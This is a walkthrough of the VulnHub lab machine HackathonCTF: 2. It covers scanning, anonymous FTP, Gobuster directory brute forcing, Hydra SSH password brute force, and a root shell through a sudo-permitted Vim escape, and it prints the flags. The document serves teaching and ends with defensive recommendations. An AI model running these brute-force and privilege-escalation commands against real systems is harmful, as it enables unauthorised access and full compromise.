# HackathonCTF: 2 (VulnHub)

## Overview

**HackathonCTF: 2** is an Easy-level VulnHub machine created by **Somu Sen**. The machine focuses on network enumeration, anonymous FTP access, directory brute forcing, SSH credential discovery, Linux post-exploitation, and privilege escalation through an insecure sudo configuration using Vim.

The challenge demonstrates how multiple low-severity issues—including anonymous file exposure, information disclosure, weak credentials, and misconfigured sudo permissions—can be chained together to achieve complete system compromise.

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | HackathonCTF: 2 |
| Author | Somu Sen |
| Series | HackathonCTF |
| Platform | VulnHub |
| Release Date | 20 June 2021 |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Objective | Obtain User and Root Flags |

## Skills Demonstrated

- Network Discovery
- Service Enumeration
- Nmap Scanning
- FTP Enumeration
- Anonymous FTP Access
- File Enumeration
- Web Enumeration
- Directory Brute Forcing
- Gobuster
- Source Code Analysis
- Username Enumeration
- SSH Password Discovery
- Hydra
- SSH Enumeration
- Linux Enumeration
- Bash History Analysis
- Sudo Enumeration
- GTFOBins
- Vim Privilege Escalation
- Linux Privilege Escalation
- Post Exploitation

## Tools Used

- Netdiscover
- Nmap
- FTP Client
- Gobuster
- Hydra
- SSH
- Vim
- GTFOBins
- Linux Shell Commands
- Kali Linux

## Attack Methodology

1. Discover the target machine.
2. Enumerate open ports and services.
3. Access the anonymous FTP service.
4. Download exposed files.
5. Analyze the custom wordlist.
6. Perform directory brute forcing.
7. Discover hidden web directory.
8. Extract the SSH username.
9. Brute force SSH credentials.
10. Obtain SSH access.
11. Enumerate the local system.
12. Identify insecure sudo permissions.
13. Exploit Vim via GTFOBins.
14. Obtain root access.

## Network Discovery

Identify the target host.

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.26
```

Target machine successfully identified.

## Open Services Identified

Perform service enumeration.

```bash
sudo nmap -sC -sV -p- 192.168.10.26 --min-rate 10000
```

### Nmap Results

| Port | Service | Version |
|--------|---------|---------|
| 21 | FTP | vsftpd |
| 80 | HTTP | Apache |
| 7223 | SSH | OpenSSH |

### Interesting Findings

- Anonymous FTP login enabled.
- Web server available on port 80.
- SSH running on a non-standard port (7223).

## Anonymous FTP Enumeration

Connect to the FTP server.

```bash
ftp 192.168.10.26
```

Login using:

```text
Username: anonymous
Password: anonymous
```

List available files.

```bash
ls -la
```

Files discovered:

```text
flag1.txt
word.dir
```

Download both files.

```bash
get flag1.txt
get word.dir
```

## User Flag

Read the first flag.

```bash
cat flag1.txt
```

Output:

```text
FLAG{7e3c118631b68d159d9399bda66fc684}
```

First flag successfully obtained.

## Wordlist Analysis

Inspect the downloaded file.

```bash
cat word.dir
```

The file contains a custom password wordlist that will later be used for directory enumeration and SSH password attacks.

## Web Enumeration

Browse the web application.

```text
http://192.168.10.26
```

The homepage contains no useful information.

Perform directory brute forcing using the custom wordlist.

```bash
gobuster dir -u http://192.168.10.26/ -w word.dir
```

Result:

```text
/happy
```

A hidden directory was successfully discovered.

## Username Discovery

Visit the hidden directory.

```text
http://192.168.10.26/happy
```

Inspect the page source.

Recovered username:

```text
hackathonll
```

## SSH Password Discovery

Use Hydra with the custom wordlist.

```bash
hydra -l hackathonll -P word.dir ssh://192.168.10.26:7223 -t 4
```

Recovered credentials:

```text
Username: hackathonll
Password: Ti@gO
```

## Initial Access

Login through SSH.

```bash
ssh hackathonll@192.168.10.26 -p 7223
```

Verify access.

```bash
whoami
```

Output:

```text
hackathonll
```

Initial foothold successfully obtained.

## Post Exploitation Enumeration

Inspect the user's home directory.

```bash
ls -la
```

Interesting file:

```text
.bash_history
```

Read its contents.

```bash
cat .bash_history
```

The history indicates repeated use of sudo commands, suggesting further privilege escalation opportunities.

## Privilege Escalation

Enumerate sudo permissions.

```bash
sudo -l
```

Output:

```text
(root) NOPASSWD: /usr/bin/vim
```

The user can execute Vim as root without authentication.

Exploit the misconfiguration.

```bash
sudo vim -c ':!/bin/bash'
```

Verify privileges.

```bash
whoami
```

Output:

```text
root
```

Confirm.

```bash
id
```

Output:

```text
uid=0(root)
gid=0(root)
```

Root shell successfully obtained.

## Root Flag

Navigate to the root directory.

```bash
cd /root
```

Read the flag.

```bash
cat flag2.txt
```

Output:

```text
FLAG{7e3c118631b68d159d9399bda66fc694}
```

Root compromise successfully achieved.

## Vulnerabilities Identified

### 1. Anonymous FTP Access

Sensitive files were exposed to unauthenticated users.

### 2. Information Disclosure

The web application's source code leaked a valid SSH username.

### 3. Weak Credentials

SSH credentials were vulnerable to dictionary attacks using the custom wordlist.

### 4. Insecure Sudo Configuration

The user was allowed to execute Vim as root without authentication.

```text
(root) NOPASSWD: /usr/bin/vim
```

### 5. Poor Security Configuration

Improper privilege delegation allowed direct root shell execution through GTFOBins.

## Attack Chain Summary

- Host Discovery using Netdiscover
- Service Enumeration using Nmap
- Anonymous FTP Access
- Download Exposed Files
- Custom Wordlist Analysis
- Gobuster Directory Enumeration
- Hidden Directory Discovery
- Username Extraction
- SSH Password Brute Force
- SSH Access
- Bash History Enumeration
- Sudo Enumeration
- Vim Privilege Escalation
- Root Access
- Flag Retrieval

## Security Recommendations

- Disable anonymous FTP access.
- Remove unnecessary exposed files.
- Avoid leaking sensitive information in HTML source code.
- Enforce strong password policies.
- Restrict SSH access where possible.
- Review sudo permissions regularly.
- Avoid granting unrestricted NOPASSWD access.
- Apply the principle of least privilege.
- Perform regular vulnerability assessments.
- Conduct periodic penetration testing.

## Key Learning Outcomes

- Anonymous FTP can expose sensitive information.
- Custom wordlists may assist in multiple attack stages.
- Source code inspection often reveals hidden information.
- Directory brute forcing remains an effective enumeration technique.
- Weak passwords are susceptible to dictionary attacks.
- GTFOBins is an excellent resource for Linux privilege escalation.
- Misconfigured sudo permissions frequently result in full system compromise.
- Enumeration remains the most important phase of penetration testing.

## Flags

### User Flag

```text
FLAG{7e3c118631b68d159d9399bda66fc684}
```

### Root Flag

```text
FLAG{7e3c118631b68d159d9399bda66fc694}
```

## Conclusion

HackathonCTF: 2 is an excellent beginner-friendly VulnHub machine that teaches the importance of careful enumeration, anonymous FTP assessment, directory brute forcing, credential discovery, SSH exploitation, Linux privilege escalation using GTFOBins, and secure privilege management. The challenge demonstrates how several minor security weaknesses can be combined to achieve complete system compromise.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
